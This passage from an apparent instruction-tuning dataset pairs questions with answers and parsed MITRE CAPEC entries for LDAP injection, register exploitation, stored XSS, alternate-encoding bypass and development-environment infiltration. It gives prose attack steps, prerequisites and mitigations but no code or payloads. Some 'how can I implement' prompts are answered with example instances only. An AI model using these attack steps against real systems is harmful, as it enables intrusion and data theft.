              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: LDAP Injection (CAPEC ID: 136), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack. See also: CVE-2005-2301",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack. See also: CVE-2005-2301",
      "@Name": "LDAP Injection (CAPEC ID: 136)",
      "attack_ptrn": {
        "@ID": "136",
        "@Name": "LDAP Injection",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker manipulates or crafts an LDAP query for the purpose of undermining the security of the target. Some applications use user input to create LDAP queries that are processed by an LDAP server. For example, a user might provide their username during authentication and the username might be inserted in an LDAP query during the authentication process. An attacker could use this input to inject additional commands into an LDAP query that could disclose sensitive information. For example, entering a * in the aforementioned query might return information about all users on the system. This attack is very similar to an SQL injection attack in that it manipulates a query to gather additional information or coerce a particular return value.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "248"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey application] The attacker takes an inventory of the entry points of the application.",
              "Technique": [
                "Spider web sites for all available links",
                "Sniff network communications with application using a utility such as WireShark."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Determine user-controllable input susceptible to LDAP injection] For each user-controllable input that the attacker suspects is vulnerable to LDAP injection, attempt to inject characters that have special meaning in LDAP (such as a single quote character, etc.). The goal is to create a LDAP query with an invalid syntax",
              "Technique": [
                "Use web browser to inject input through text fields or through HTTP GET parameters",
                "Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header.",
                "Use modified client (modified by reverse engineering) to inject input."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Try to exploit the LDAP injection vulnerability] After determining that a given input is vulnerable to LDAP Injection, hypothesize what the underlying query looks like. Possibly using a tool, iteratively try to add logic to the query to extract information from the LDAP, or to modify or delete information in the LDAP.",
              "Technique": [
                "Add logic to the LDAP query to change the meaning of that command. Automated tools could be used to generate the LDAP injection strings.",
                "Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, or other HTTP header."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target application must accept a string as user input, fail to sanitize characters that have a special meaning in LDAP queries in the user input, and insert the user-supplied string in an LDAP query which is then processed."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker needs to have knowledge of LDAP, especially its query syntax."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as LDAP content.",
            "Use of custom error pages - Attackers can glean information about the nature of queries from descriptive error messages. Input validation must be coupled with customized error pages that inform about an error without disclosing information about the LDAP or application."
          ]
        },
        "Example_Instances": {
          "Example": "PowerDNS before 2.9.18, when running with an LDAP backend, does not properly escape LDAP queries, which allows remote attackers to cause a denial of service (failure to answer ldap questions) and possibly conduct an LDAP injection attack. See also: CVE-2005-2301"
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "77"
            },
            {
              "@CWE_ID": "90"
            },
            {
              "@CWE_ID": "20"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "29",
              "Entry_Name": "LDAP Injection"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "LDAP Injection"
            }
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-17",
              "@Section": "WASC-29 - LDAP Injection"
            },
            {
              "@External_Reference_ID": "REF-608",
              "@Section": "Testing for LDAP Injection"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Consequences"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Exploitation of Improperly Controlled Registers (CAPEC ID: 680)",
    "context": "",
    "output": "Examples of Exploitation of Improperly Controlled Registers (CAPEC ID: 680) are: During a System-on-Chip's (SoC) secure boot process, the code to be authenticated is measured to determine the code's validity. This entails the one-way hash of the code binary being calculated and extended to the previous hash. The value obtained after completion of the boot flow is then stored in a register with the intent of later verifying this value to determine if the boot flow has been tampered with. However, the register being used does not prevent an adversary from modifying the register's contents, which can result in the adversary spoofing the measurement data used in the attestation process.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "During a System-on-Chip's (SoC) secure boot process, the code to be authenticated is measured to determine the code's validity. This entails the one-way hash of the code binary being calculated and extended to the previous hash. The value obtained after completion of the boot flow is then stored in a register with the intent of later verifying this value to determine if the boot flow has been tampered with. However, the register being used does not prevent an adversary from modifying the register's contents, which can result in the adversary spoofing the measurement data used in the attestation process.",
      "@Name": "Exploitation of Improperly Controlled Registers (CAPEC ID: 680)",
      "attack_ptrn": {
        "@ID": "680",
        "@Name": "Exploitation of Improperly Controlled Registers",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": {
          "xhtml:p": "An adversary exploits missing or incorrectly configured access control within registers to read/write data that is not meant to be obtained or modified by a user."
        },
        "Extended_Description": {
          "xhtml:p": "Hardware systems often utilize trusted lock bits to prevent a set of registers from being written to or to restrict a register to only being written to once. Registers are also frequently used to store sensitive data leveraged in additional security operations, such as secure booting, authenticating code, device attestation, and more. However, the access control mechanisms meant to protect these registers may be fully missing or ineffective due to misconfiguration. If an adversary is able to discover improper access controls surrounding registers, it could result in the adversary obtaining sensitive data and/or modifying data that is meant to be immutable. This can ultimately result in processes like secure boot being circumvented or in protected configurations being modified."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "1",
              "Exclude_Related": {
                "@Exclude_ID": "513"
              }
            },
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "180",
              "Exclude_Related": {
                "@Exclude_ID": "513"
              }
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "Awareness of the hardware being leveraged.",
            "Access to the hardware being leveraged."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Intricate knowledge of registers."
          }
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design proper access control policies for hardware register access from software and ensure these policies are implemented in accordance with the specified design.",
            "Ensure security lock bit protections are reviewed for design inconsistencies and common weaknesses.",
            "Test security lock programming flow in both pre-silicon and post-silicon environments.",
            "Leverage automated tools to test that values are not reprogrammable and that write-once fields lock on writing zeros.",
            "Ensure that measurement data is stored in registers that are read-only or otherwise have access controls that prevent modification by an untrusted agent."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "During a System-on-Chip's (SoC) secure boot process, the code to be authenticated is measured to determine the code's validity. This entails the one-way hash of the code binary being calculated and extended to the previous hash. The value obtained after completion of the boot flow is then stored in a register with the intent of later verifying this value to determine if the boot flow has been tampered with. However, the register being used does not prevent an adversary from modifying the register's contents, which can result in the adversary spoofing the measurement data used in the attestation process."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "1224"
            },
            {
              "@CWE_ID": "1231"
            },
            {
              "@CWE_ID": "1233"
            },
            {
              "@CWE_ID": "1262"
            },
            {
              "@CWE_ID": "1283"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-693"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-10-21"
          }
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Stored XSS (CAPEC ID: 592), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: An adversary determines that a system uses a web based interface for administration. The adversary creates a new user record and supplies a malicious script in the user name field. The user name field is not validated by the system and a new log entry is created detailing the creation of the new user. Later, an administrator reviews the log in the administrative console. When the administrator comes across the new user entry, the browser sees a script and executes it, stealing the administrator's authentication cookie and forwarding it to the adversary. An adversary then uses the received authentication cookie to log in to the system as an administrator, provided that the administrator console can be accessed remotely.\nAn online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. An adversary embeds JavaScript in the image tags of their message. The adversary then sends the victim an email advertising free goods and provides a link to the form for how to collect. When the victim visits the forum and reads the message, the malicious script is executed within the victim's browser.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An adversary determines that a system uses a web based interface for administration. The adversary creates a new user record and supplies a malicious script in the user name field. The user name field is not validated by the system and a new log entry is created detailing the creation of the new user. Later, an administrator reviews the log in the administrative console. When the administrator comes across the new user entry, the browser sees a script and executes it, stealing the administrator's authentication cookie and forwarding it to the adversary. An adversary then uses the received authentication cookie to log in to the system as an administrator, provided that the administrator console can be accessed remotely.",
        "An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. An adversary embeds JavaScript in the image tags of their message. The adversary then sends the victim an email advertising free goods and provides a link to the form for how to collect. When the victim visits the forum and reads the message, the malicious script is executed within the victim's browser."
      ],
      "@Name": "Stored XSS (CAPEC ID: 592)",
      "attack_ptrn": {
        "@ID": "592",
        "@Name": "Stored XSS",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary utilizes a form of Cross-site Scripting (XSS) where a malicious script is persistently \"stored\" within the data storage of a vulnerable web application as valid input.",
        "Extended_Description": {
          "xhtml:p": "Initially presented by an adversary to the vulnerable web application, the malicious script is incorrectly considered valid input and is not properly encoded by the web application. A victim is then convinced to use the web application in a way that creates a response that includes the malicious script. This response is subsequently sent to the victim and the malicious script is executed by the victim's browser. To launch a successful Stored XSS attack, an adversary looks for places where stored input data is used in the generation of a response. This often involves elements that are not expected to host scripts such as image tags (<img>), or the addition of event attributes such as onload and onmouseover. These elements are often not subject to the same input validation, output encoding, and other content filtering and checking routines."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "63"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for stored user-controllable inputs] Using a browser or an automated tool, an adversary follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application. The adversary is looking for areas where user input is stored, such as user profiles, shopping carts, file managers, forums, blogs, and logs.",
              "Technique": [
                "Use a spidering tool to follow and record all links and analyze the web pages to find entry points.",
                "Use a proxy tool to record all links visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe identified potential entry points for stored XSS vulnerability] The adversary uses the entry points gathered in the \"Explore\" phase as a target list and injects various common script payloads and special characters to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.",
              "Technique": [
                "Use a list of XSS probe strings to submit script in input fields that could be stored by the web application. If possible, the probe strings contain a unique identifier so they can be queried for after submitting to see if they are stored.",
                "Use a list of HTML special characters to submit in input fields that could be stored by the web application and check if they were properly encoded, replaced, or filtered out."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Store malicious XSS content] Once the adversary has determined which stored locations are vulnerable to XSS, they will interact with the web application to store the malicious content. The adversary can have many goals, from stealing session IDs, cookies, credentials, and page content from a victim.",
              "Technique": [
                "Store a malicious script on a page that will execute when viewed by the victim.",
                "Use a tool such as BeEF to store a hook into the web application. This will alert the adversary when the victim has accessed the content and will give the adversary control over the victim's browser, allowing them access to cookies, user screenshot, user clipboard, and more complex XSS attacks."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Get victim to view stored content] In order for the attack to be successful, the victim needs to view the stored malicious content on the webpage.",
              "Technique": [
                "Send a phishing email to the victim containing a URL that will direct them to the malicious stored content.",
                "Simply wait for a victim to view the content. This is viable in situations where content is posted to a popular public forum."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An application that leverages a client-side web browser with scripting enabled.",
            "An application that fails to adequately sanitize or encode untrusted input.",
            "An application that stores information provided by the user in data storage of some kind."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Requires the ability to write scripts of varying complexity and to inject them through user controlled fields within the application."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data",
              "Note": "A successful Stored XSS attack can enable an adversary to exfiltrate sensitive information from the application."
            },
            {
              "Scope": [
                "Confidentiality",
                "Authorization",
                "Access Control"
              ],
              "Impact": "Gain Privileges",
              "Note": "A successful Stored XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access."
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "A successful Stored XSS attack can enable an adversary run arbitrary code of their choosing, thus enabling a complete compromise of the application."
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data",
              "Note": "A successful Stored XSS attack can allow an adversary to tamper with application data."
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Use browser technologies that do not allow client-side scripting.",
            "Utilize strict type, character, and encoding enforcement.",
            "Ensure that all user-supplied input is validated before being stored."
          ]
        },
        "Example_Instances": {
          "Example": [
            "An adversary determines that a system uses a web based interface for administration. The adversary creates a new user record and supplies a malicious script in the user name field. The user name field is not validated by the system and a new log entry is created detailing the creation of the new user. Later, an administrator reviews the log in the administrative console. When the administrator comes across the new user entry, the browser sees a script and executes it, stealing the administrator's authentication cookie and forwarding it to the adversary. An adversary then uses the received authentication cookie to log in to the system as an administrator, provided that the administrator console can be accessed remotely.",
            "An online discussion forum allows its members to post HTML-enabled messages, which can also include image tags. An adversary embeds JavaScript in the image tags of their message. The adversary then sends the victim an email advertising free goods and provides a link to the form for how to collect. When the victim visits the forum and reads the message, the malicious script is executed within the victim's browser."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "79"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-605",
            "@Section": "Testing for Stored Cross Site Scripting"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2017-04-15"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Leverage Alternate Encoding (CAPEC ID: 267)",
    "context": "",
    "output": "Examples of Leverage Alternate Encoding (CAPEC ID: 267) are: Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified \"encoding strings,\" which allows remote adversaries to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka \"Post Encoding Information Disclosure Vulnerability.\" Related Vulnerabilities CVE-2010-0488\n* Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified \"encoding strings,\" which allows remote adversaries to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka \"Post Encoding Information Disclosure Vulnerability.\" Related Vulnerabilities CVE-2010-0488",
        "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses."
      ],
      "@Name": "Leverage Alternate Encoding (CAPEC ID: 267)",
      "attack_ptrn": {
        "@ID": "267",
        "@Name": "Leverage Alternate Encoding",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary leverages the possibility to encode potentially harmful input or content used by applications such that the applications are ineffective at validating this encoding standard.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "153"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for user-controllable inputs] Using a browser, an automated tool or by inspecting the application, an adversary records all entry points to the application.",
              "Technique": [
                "Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.",
                "Manually inspect the application to find entry points."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe entry points to locate vulnerabilities] The adversary uses the entry points gathered in the \"Explore\" phase as a target list and injects various payloads using a variety of different types of encodings to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.",
              "Technique": "Try to use different encodings of content in order to bypass validation routines."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The application's decoder accepts and interprets encoded characters. Data canonicalization, input filtering and validating is not done properly leaving the door open to harmful characters for the target host."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "An adversary can inject different representation of a filtered character in a different encoding."
            },
            {
              "@Level": "Medium",
              "#text": "An adversary may craft subtle encoding of input data by using the knowledge that they have gathered about the target host."
            }
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            },
            {
              "Scope": "Availability",
              "Impact": [
                "Unreliable Execution",
                "Resource Consumption"
              ],
              "Note": "Denial of Service"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)",
            "Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system. Test your decoding process against malicious input."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Microsoft Internet Explorer 5.01 SP4, 6, 6 SP1, and 7 does not properly handle unspecified \"encoding strings,\" which allows remote adversaries to bypass the Same Origin Policy and obtain sensitive information via a crafted web site, aka \"Post Encoding Information Disclosure Vulnerability.\" Related Vulnerabilities CVE-2010-0488",
            "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "173"
            },
            {
              "@CWE_ID": "172"
            },
            {
              "@CWE_ID": "180"
            },
            {
              "@CWE_ID": "181"
            },
            {
              "@CWE_ID": "73"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "697"
            },
            {
              "@CWE_ID": "692"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1027",
            "Entry_Name": "Obfuscated Files or Information"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-108",
              "@Section": "WASC-20 - Improper Input Handling"
            },
            {
              "@External_Reference_ID": "REF-109",
              "@Section": "Category: Encoding"
            },
            {
              "@External_Reference_ID": "REF-110",
              "@Section": "Canonicalization, locale and Unicode"
            },
            {
              "@External_Reference_ID": "REF-69",
              "@Section": "XSS (Cross Site Scripting) Prevention Cheat Sheet"
            },
            {
              "@External_Reference_ID": "REF-112",
              "@Section": "Chapter 5 Section 9: Character Encoding"
            },
            {
              "@External_Reference_ID": "REF-113",
              "@Section": "Character encoding"
            },
            {
              "@External_Reference_ID": "REF-114"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-01-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Description Summary, Examples-Instances, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Consequences"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Mitigations, Skills_Required, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Example_Instances, Execution_Flow, Skills_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Infiltration of Software Development Environment (CAPEC ID: 511)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Infiltration of Software Development Environment (CAPEC ID: 511) are: The attacker, knowing the victim runs email on a system adjacent to the IDE system, sends a phishing email with a malicious attachment to the victim. When viewed, the malicious attachment installs a backdoor that allows the attacker to remotely compromise the adjacent IDE system from the victim's workstation. The attacker is then able to exfiltrate sensitive data about the software being developed on the IDE system.\n* Using rogue versions of Xcode (Apple's app development tool) downloaded from third-party websites, it was possible for the adversary to insert malicious code into legitimate apps during the development process.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "The attacker, knowing the victim runs email on a system adjacent to the IDE system, sends a phishing email with a malicious attachment to the victim. When viewed, the malicious attachment installs a backdoor that allows the attacker to remotely compromise the adjacent IDE system from the victim's workstation. The attacker is then able to exfiltrate sensitive data about the software being developed on the IDE system.",
        "Using rogue versions of Xcode (Apple's app development tool) downloaded from third-party websites, it was possible for the adversary to insert malicious code into legitimate apps during the development process."
      ],
      "@Name": "Infiltration of Software Development Environment (CAPEC ID: 511)",
      "attack_ptrn": {
        "@ID": "511",
        "@Name": "Infiltration of Software Development Environment",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker uses common delivery mechanisms such as email attachments or removable media to infiltrate the IDE (Integrated Development Environment) of a victim manufacturer with the intent of implanting malware allowing for attack control of the victim IDE environment. The attack then uses this access to exfiltrate sensitive data or information, manipulate said data or information, and conceal these actions. This will allow and aid the attack to meet the goal of future compromise of a recipient of the victim's manufactured product further down in the supply chain.",
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "444",
            "Exclude_Related": [
              {
                "@Exclude_ID": "513"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).",
            "The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.",
            "The attacker must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Medium",
              "#text": "Intelligence about the manufacturer's operating environment and infrastructure."
            },
            {
              "@Level": "High",
              "#text": "Ability to develop, deploy, and maintain a stealth malicious backdoor program remotely in what is essentially a hostile environment."
            },
            {
              "@Level": "High",
              "#text": "Development skills to construct malicious attachments that can be used to exploit vulnerabilities in typical desktop applications or system configurations. The malicious attachments should be crafted well enough to bypass typical defensive systems (IDS, anti-virus, etc)"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Avoid the common delivery mechanisms of adversaries, such as email attachments, which could introduce the malware."
        },
        "Example_Instances": {
          "Example": [
            "The attacker, knowing the victim runs email on a system adjacent to the IDE system, sends a phishing email with a malicious attachment to the victim. When viewed, the malicious attachment installs a backdoor that allows the attacker to remotely compromise the adjacent IDE system from the victim's workstation. The attacker is then able to exfiltrate sensitive data about the software being developed on the IDE system.",
            "Using rogue versions of Xcode (Apple's app development tool) downloaded from third-party websites, it was possible for the adversary to insert malicious code into legitimate apps during the development process."
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.001",
            "Entry_Name": "Supply Chain Compromise: Compromise Software Dependencies and Development Tools"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-439"
          }
        },
        "Content_History": {
